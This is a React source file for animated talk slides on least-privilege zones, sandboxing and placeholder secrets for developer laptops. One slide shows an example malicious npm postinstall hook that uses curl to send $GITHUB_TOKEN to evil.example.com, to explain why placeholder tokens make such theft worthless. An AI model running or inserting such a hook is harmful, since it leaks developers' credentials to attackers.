import { motion } from 'motion/react';
import { R, Words, useSlide, useVisible, EASE } from '../engine/anim';
import { Arr, Clawd, Emoji, Kicker, Tick, WhiteCard } from '../components';

/* ───────────────────────── the privilege matrix ───────────────────────── */
// \u200b = allowed line-break points in the narrow header cells
const ASSETS = ['grafana/\u200bgrafana', 'plugins', 'mycorp/\u200bgitops', 'AWS', 'kubeconfig', 'Vault', 'Slack'];
const TASKS: { label: string; needs: number[]; at: number }[] = [
  { label: 'Fix a bug in grafana/grafana', needs: [0], at: 0 },
  { label: 'Review a plugin PR', needs: [0, 1], at: 0 },
  { label: 'Be on-call', needs: [2, 3, 4, 5, 6], at: 0 },
  { label: 'npm install', needs: [], at: 1 },
];

function Cell({ on, red, at, d }: { on: boolean; red?: boolean; at: number; d: number }) {
  const vis = useVisible(at);
  return (
    <div className="mx-cell">
      <motion.div
        className={`mx-dot${on ? ' on' : ''}${red ? ' red' : ''}`}
        initial={false}
        animate={{ scale: vis ? 1 : 0, opacity: vis ? 1 : 0 }}
        transition={vis ? { type: 'spring', stiffness: 420, damping: 16, delay: d } : { duration: 0.2 }}
      />
    </div>
  );
}

export function LaptopMatrix() {
  const { step } = useSlide();
  return (
    <>
      <Kicker ch="laptop" />
      <div className="abs display" style={{ left: 120, top: 140, fontSize: 92 }}>
        <Words text="Your laptop is *overprivileged.*" />
      </div>
      <div className="abs mx" style={{ left: 120, top: 300, width: 1680 }}>
        <R v="fade" d={0.3} className="mx-row mx-head">
          <div className="mx-task" />
          {ASSETS.map((a) => (
            <div key={a} className="mx-cell mx-asset">
              {a}
            </div>
          ))}
        </R>
        {TASKS.map((t, ti) => (
          <R key={t.label} at={t.at} d={0.4 + ti * 0.12} v="left" className={`mx-row${t.at === 1 && step >= 1 ? ' npm' : ''}`}>
            <div className="mx-task">{t.label}</div>
            {ASSETS.map((a, ai) => (
              <Cell key={a} on={t.needs.includes(ai)} at={t.at} d={0.55 + ti * 0.12 + ai * 0.04} />
            ))}
          </R>
        ))}
        <R at={2} v="up" className="mx-row mx-union">
          <div className="mx-task">
            <b>Your laptop</b>
          </div>
          {ASSETS.map((a, ai) => (
            <Cell key={a} on red at={2} d={0.25 + ai * 0.07} />
          ))}
        </R>
      </div>
      <R at={1} d={0.4} className="abs npm-note" style={{ left: 550, top: 720, width: 1240, textAlign: 'center' }}>
        needs <b>nothing</b>, but it’s all right there
      </R>
      <R at={2} d={0.8} className="abs lede" style={{ left: 120, top: 952, width: 1680, fontSize: 36 }}>
        Every task runs at the privilege level of your <span className="accent">most privileged</span> task.
      </R>
    </>
  );
}

/* ───────────────────────── least-privilege zones ───────────────────────── */
type Z = 'grafana' | 'oncall' | 'untrusted';
const ZONES: { id: Z; label: string; x: number }[] = [
  { id: 'grafana', label: 'Grafana zone', x: 120 },
  { id: 'oncall', label: 'On-call zone', x: 700 },
  { id: 'untrusted', label: 'npm install zone', x: 1280 },
];
const ZCHIPS: { id: string; label: string; zone: Z }[] = [
  { id: 'gg', label: 'grafana/grafana', zone: 'grafana' },
  { id: 'dt', label: 'mycorp/gitops', zone: 'oncall' },
  { id: 'pl', label: 'plugins', zone: 'grafana' },
  { id: 'aws', label: 'AWS', zone: 'oncall' },
  { id: 'reg', label: 'npm + Go registries', zone: 'grafana' },
  { id: 'kube', label: 'kubeconfig', zone: 'oncall' },
  { id: 'wc', label: 'this one working copy', zone: 'untrusted' },
  { id: 'vault', label: 'Vault', zone: 'oncall' },
  { id: 'slack', label: 'Slack', zone: 'oncall' },
];

function zchipPos(c: (typeof ZCHIPS)[number], i: number, split: boolean) {
  if (!split) {
    const col = i % 3;
    const row = Math.floor(i / 3);
    return { x: 200 + col * 540 + (row % 2) * 70, y: 450 + row * 110 };
  }
  const z = ZONES.find((z) => z.id === c.zone)!;
  const k = ZCHIPS.filter((x) => x.zone === c.zone).indexOf(c);
  return { x: z.x + 34, y: 450 + k * 84 };
}

export function Zones() {
  const { step, shown } = useSlide();
  const split = step >= 1;
  return (
    <>
      <Kicker ch="laptop" />
      <div className="abs display" style={{ left: 120, top: 140, fontSize: 92 }}>
        <Words text="Least-privilege *zones.*" />
      </div>
      <R d={0.3} className="abs lede" style={{ left: 120, top: 262, fontSize: 34, opacity: 0.7 }}>
        Compartmentalize your laptop. Seamlessly, or it won’t be done.
      </R>
      {ZONES.map((z, i) => (
        <motion.div
          key={z.id}
          className={`abs zone${split ? ' split' : ''} z-${z.id}`}
          initial={false}
          animate={
            split
              ? { left: z.x, top: 360, width: 520, height: 560, opacity: shown ? 1 : 0 }
              : { left: 120, top: 360, width: 1680, height: 560, opacity: shown ? (i === 0 ? 1 : 0) : 0 }
          }
          transition={{ duration: 0.9, ease: EASE, delay: split ? i * 0.06 : 0 }}
        >
          <motion.div className="zone-label" initial={false} animate={{ opacity: split ? 1 : 0 }} transition={{ delay: split ? 0.5 : 0 }}>
            {z.label}
          </motion.div>
        </motion.div>
      ))}
      <motion.div className="abs zone-label big" initial={false} animate={{ opacity: shown && !split ? 1 : 0 }} style={{ left: 154, top: 384 }}>
        your laptop
      </motion.div>
      {ZCHIPS.map((c, i) => {
        const p = zchipPos(c, i, split);
        return (
          <motion.div
            key={c.id}
            className={`abs zchip z-${c.zone}${split ? ' split' : ''}`}
            initial={false}
            animate={{ left: p.x, top: p.y, opacity: shown ? 1 : 0 }}
            transition={{ duration: 0.9, ease: EASE, delay: shown && !split ? 0.3 + i * 0.04 : split ? 0.1 + (i % 4) * 0.05 : 0 }}
          >
            {c.label}
          </motion.div>
        );
      })}
      <R at={1} d={0.9} className="abs zone-empty" style={{ left: 1314, top: 560, width: 460 }}>
        no credentials. nothing to steal.
      </R>
      <R at={2} className="abs zone-foot" style={{ left: 120, top: 950, width: 1680 }}>
        Not always separate, but when you <code>npm install</code>, you don’t need AWS and mycorp/gitops.
      </R>
    </>
  );
}

/* ───────────────────────── sandbox = scoping tool ───────────────────────── */
function Req({ n, title, sub, at }: { n: string; title: string; sub: React.ReactNode; at: number }) {
  return (
    <R at={at} v="up" className="req">
      <div className="req-n">{n}</div>
      <div>
        <div className="req-title">{title}</div>
        <div className="req-sub">{sub}</div>
      </div>
    </R>
  );
}

export function Scope() {
  return (
    <>
      <WhiteCard />
      <div className="abs display" style={{ left: 140, top: 120, fontSize: 88, color: 'var(--ink)', width: 1640 }}>
        <Words text="A sandbox isn’t a trust solution." />
        <br />
        <Words at={1} text="It’s a ^scoping^ *tool.*" />
      </div>
      <div className="abs reqs" style={{ left: 140, top: 380, width: 1640 }}>
        <Req at={2} n="01" title="Separate what you work on" sub={<>A kernel sandbox or a VM. <b>Docker is not isolation.</b></>} />
        <Req at={2} n="02" title="Reach only what’s needed" sub="Per-context profiles: Grafana, on-call, that sketchy repo…" />
        <Req at={3} n="03" title="Keep secrets out of reach" sub="Nothing to exfiltrate if it was never there." />
        <Req at={3} n="04" title="Make it seamless" sub="…or nobody will do it. Including you." />
      </div>
      <R at={4} className="abs scope-foot" style={{ left: 140, top: 876, width: 1640 }}>
        Not worry-free. But the cheapest way to make least privilege real, <span className="serif-i">especially on your laptop.</span>
      </R>
    </>
  );
}

/* ───────────────────────── placeholder secrets ───────────────────────── */
const LANE = 672;
const LANE_EVIL = 840;
const X = { sandbox: 370, proxy: 960, gh: 1550 };

function Wire({ at, d, color }: { at: number; d: string; color: string }) {
  const vis = useVisible(at);
  return (
    <motion.path
      d={d}
      stroke={color}
      strokeWidth={3}
      fill="none"
      initial={false}
      animate={{ pathLength: vis ? 1 : 0, opacity: vis ? 1 : 0 }}
      transition={{ duration: vis ? 0.6 : 0.2, ease: EASE, opacity: { duration: 0.15 } }}
    />
  );
}

export function Placeholders() {
  return (
    <>
      <Kicker ch="laptop" />
      <div className="abs display" style={{ left: 120, top: 140, fontSize: 92 }}>
        <Words text="Keep secrets *out of reach.*" />
      </div>

      {/* 0 · the sandbox only ever sees the placeholder */}
      <R d={0.2} v="up" className="abs ph-box" style={{ left: 120, top: 300, width: 500, height: 300 }}>
        <div className="ph-title">
          <Clawd size={54} /> inside the sandbox
        </div>
        <div className="ph-term">
          <div>
            <span className="accent">$</span> echo $GITHUB_TOKEN
          </div>
          <div className="ph-fake">phx_5f1c9a…e21</div>
          <div className="ph-dim"># a placeholder. that’s all it ever sees.</div>
        </div>
      </R>

      {/* 1 · the network path flips it */}
      <R at={1} v="up" className="abs ph-box proxy" style={{ left: 700, top: 300, width: 520, height: 300 }}>
        <div className="ph-title">
          <Emoji n="key" size={40} /> network path
        </div>
        <div className="ph-flip">
          <R at={1} d={0.35} v="fade" className="ph-fake">
            phx_5f1c…
          </R>
          <R at={1} d={0.65} v="left">
            <Arr size={30} />
          </R>
          <R at={1} d={0.9} v="pop" className="ph-real">
            ghp_••••••
          </R>
        </div>
        <div className="ph-body">
          flips it for the real token, <b>only</b> on the way to api.github.com
        </div>
        <div className="ph-src">real token from op://agents/github/token</div>
      </R>

      {/* 2 · GitHub gets the real one */}
      <R at={2} v="up" className="abs ph-box gh" style={{ left: 1300, top: 300, width: 500, height: 300 }}>
        <div className="ph-title">api.github.com</div>
        <div className="ph-term">
          <div className="ph-dim">Authorization: Bearer</div>
          <div className="ph-real">ghp_•••••••••••• (real)</div>
          <R at={2} d={0.5} v="fade" className="ph-ok">
            <Tick /> 201 Created
          </R>
        </div>
      </R>

      <svg className="abs" style={{ left: 0, top: 0 }} width={1920} height={1080} viewBox="0 0 1920 1080">
        <Wire at={1} d={`M ${X.sandbox} 600 V ${LANE} H ${X.proxy} V 600`} color="rgba(250, 222, 42, 0.55)" />
        <Wire at={2} d={`M ${X.proxy} 600 V ${LANE} H ${X.gh} V 600`} color="rgba(115, 191, 105, 0.6)" />
        <Wire at={3} d={`M ${X.sandbox} ${LANE} V ${LANE_EVIL} H 1300`} color="rgba(242, 73, 92, 0.65)" />
      </svg>
      <R at={1} d={0.3} v="pop" className="abs wire-chip fake" style={{ left: (X.sandbox + X.proxy) / 2, top: LANE - 22 }}>
        Bearer phx_5f1c…
      </R>
      <R at={2} d={0.3} v="pop" className="abs wire-chip real" style={{ left: (X.proxy + X.gh) / 2, top: LANE - 22 }}>
        Bearer ghp_••••••
      </R>

      {/* 3 · and the attacker gets… the placeholder */}
      <R at={3} className="abs ph-evil-cmd" style={{ left: 400, top: 736 }}>
        <span className="accent">postinstall:</span> curl -d $GITHUB_TOKEN https://evil.example.com
      </R>
      <R at={3} d={0.3} v="pop" className="abs wire-chip evil" style={{ left: 840, top: LANE_EVIL - 22 }}>
        phx_5f1c…
      </R>
      <R at={3} d={0.2} v="up" className="abs ph-box evil" style={{ left: 1300, top: 782, width: 500 }}>
        <div className="ph-title" style={{ color: 'var(--g-red)', marginBottom: 14 }}>
          <Emoji n="skull" size={36} /> evil.example.com
        </div>
        <div className="ph-body">
          receives <code className="ph-fake">phx_5f1c9a…e21</code>
        </div>
        <div className="ph-worthless">Worthless.</div>
      </R>
      <R at={3} d={0.8} className="abs lede" style={{ left: 120, top: 950, fontSize: 34 }}>
        No token to exfiltrate in the first place. <Arr size={26} /> <span className="accent">nono and smolvm</span> both do this.
      </R>
    </>
  );
}
